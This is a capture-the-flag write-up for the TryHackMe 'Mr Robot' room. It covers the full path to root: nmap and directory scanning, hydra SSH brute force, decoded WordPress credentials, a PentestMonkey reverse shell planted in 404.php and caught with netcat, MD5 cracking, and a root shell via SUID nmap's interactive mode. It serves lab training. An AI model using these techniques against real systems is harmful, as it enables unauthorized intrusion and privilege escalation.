---
layout: default
title: Mr Robot CTF
parent: TryHackMe
---
# CTF Writeup: [Mr Robot CTF](https://tryhackme.com/room/mrrobot)

> **Platform:** [**TryHackMe**](https://tryhackme.com/) |
> **OS:** Linux |
> **Difficulty:** Medium |
> **Date:** 15.11.2025 |
> **Author:** [*S3Z4R*](https://tryhackme.com/p/SeZaR)

---
## 1. Reconnaissance
First of all, let's scan the network to get a general idea of what we are dealing with:
### Nmap
```bash
❯ nmap -sV -sC -T4 -v <Machine-IP>
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 6c:4c:44:84:40:25:0c:07:ee:3d:45:4b:a1:f0:ce:19 (RSA)
|   256 8f:37:c6:d1:8a:c3:d9:df:92:5a:60:94:63:f5:08:de (ECDSA)
|_  256 69:bf:b0:ea:2b:fd:c9:23:bf:ea:67:28:95:54:e6:36 (ED25519)
80/tcp  open  http     Apache httpd
|_http-title: Site doesnt have a title (text/html).
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
443/tcp open  ssl/http Apache httpd
|_http-title: Site doesnt have a title (text/html).
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
|_SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We can see that we have `Https:443`, `Http:80` and `SSH:22` Let's check the website. 

### Directory Enumeration
Let's scan with `feroxbuster` to get a grasp of the subdomains:
```bash
❯ feroxbuster -u https://<Machine-IP> -w kali-wordlists/dirb/big.txt -k
. . . .
. . . . .
```
Since the `feroxbuster` was taking too long i searched common pages and found:
```bash
http://<Machine-IP>/robots.txt
User-agent: *
fsocity.dic
key-1-of-3.txt
```

### First Key
We found the first key in the directory below:
```bash
http://<Machine-IP>/key-1-of-3.txt
0734...24b9
```

### Brute Forcing
In the other directory we have a long list of words which can come in handy later on, so let's keep that in mind:
```bash
http://<Machine-IP>/fsocity.dic
. . . 
the
now
Wikia
extensions
scss
window
http
var
page
Robot
. . .
```
we can save the dictionary using `curl` command below:
```bash
curl http://<Machine-IP>/fsocity.dic > fsdic.txt
```
The list is very huge and it is not usable in this form, let's clear out the duplicates first to see if it gets shorter, for this we use `sort` command and `-u` which is the `unique` option here:
```bash
❯ sort -u fsdic.txt > fsdicunique.txt
❯ du -lh fsdi*
7.0M    fsdic.txt
96K     fsdicunique.txt
```
It is reduced from `7M` to `96K` which is a lot better.

### User Enumeration
Let's try some common usernames such as `admin`, `fsociety` before bruteforcing:
```bash
❯ ssh admin@<Machine-IP>
admin@<Machine-IP>'s password:

❯ ssh fsociety@<Machine-IP>
fsociety@<Machine-IP>'s password:
```
We have found two users by guessing the usernames, but to make sure let's try bruteforcing the `fsociety` with the dictionary we found on the site:
```bash
❯ hydra -l fsocity -P fsdicunique.txt ssh://<Machine-IP>
No Luck!
```
Using the unique dictionary we found on the website is taking really long and this seems to be a deadend!
Let's see what `feroxbuster ` came up with.

## 2. Initial Access
To obtain the username and password we have two methods.
First the `License Subdomain`, and second the `Bruteforcing`.
### 2.1. License Subdomain
Among the pages `feroxbuster` found we can look at the page below:
```bash
https://<Machine-IP>/license
what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?

# But if we use Inspect Element we see:
do you want a password or something?
ZWxsaW90OkVSMjgtMDY1Mgo=
```
Let's crack it!
```bash
❯ echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 -d
elliot:ER28-0652
```

### 2.2 Bruteforce
**Recall:** We could also bruteforce this step since i found the `username` and `password` in the dictionary on the website:
```bash
❯ grep 'elliot' fsdicunique.txt
elliot  # Username exists
elliots
❯ grep 'ER28-0652' fsdicunique.txt
ER28-0652 # Password exists
```
Keep in mind that we can find the username by entering suspicious usernames on the `http://<Machine-IP>/wp-login.php`, because the page responds with `username and password invalid`, if we enter `elliot` we can see the `password invalid` which means the username is correct then we can use this and the dictionary to bruteforce it.

### Continue the Initial Access
Let's use the credentials we found in the login page which `feroxbuster` gave us:
```bash
http://<Machine-IP>/wp-login.php
Username: elliot
Password: ER28-0652
```

* 1. We find that in the `Appearance` we have `Editor`.
* 2. We can edit `404.php` here for our reverse shell.
* 3. We can use `PentestMonkey`. Edit it as you like.
* 4. After saving it we will go to a new tab and go to the following url:
`http://<Machine-IP>/404.php`
* 5. Before entering the url, we should also use netcat to liste: `nc -lnvp 1234`

After running we will get the shell:
```bash
❯ nc -nlvp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from <Machine-IP>.
Ncat: Connection from <Machine-IP>:60422.
Linux <Machine-IP> 5.15.0-139-generic
 14:12:31 up  1:49,  0 users,  load average: 6.79, 6.64, 6.75
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
```
Now we have access with the user `daemon`!

### Second Key
Let's see what we are capable of.
Going to the `/home/robot` we can see:
```bash
$ ls
key-2-of-3.txt
password.raw-md5
```
We can read the key with the following command:
```bash
$ cat key-2-of-3.txt
Permission Denied!

$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```
After cracking the hash which is a `md5` we have:
```bash
Username: robot
Password: abcdefghijklmnopqrstuvwxyz
```
We can now ssh using the username and password.
```bash
$ whoami
robot
```
We can now read the second key:
```bash
$ cat key-2-of-3.txt
822c...f959
```

## 3. Priviledge Escalation
Let's see what we are cabale of as user `robot`:
We can not `sudo -l` so we use `find` command as below:
```bash
$ find / -type f -perm -4000 2>/dev/null
/bin/umount
/bin/mount
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/local/bin/nmap #Here
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
There is `/usr/local/bin/nmap` so let's go to `GTFOBins` and see if we have something for it:
I found the command below for it:
```bash
$ sudo nmap --interactive
[sudo] password for robot:
robot is not in the sudoers file.  This incident will be reported.

# Let's use it without sudo
$ nmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh

root@<Machine-IP>:~# whoami
root
```

### Third Key
We can find the key in the following directory:
```bash
root@<Machine-IP>:~# cat /root/key-3-of-3.txt
0478...b4e4
```

---
<p style="text-align: center; text-shadow: 0 0 5px #8B0000;"> ⸸ 𝕬𝖘 𝖞𝖔𝖚 𝖜𝖎𝖑𝖑 𝖎𝖙, 𝖘𝖔 𝖎𝖙 𝖘𝖍𝖆𝖑𝖑 𝖇𝖊 ⸸ 𝕾3𝖅4𝕽 ⸸ </p>
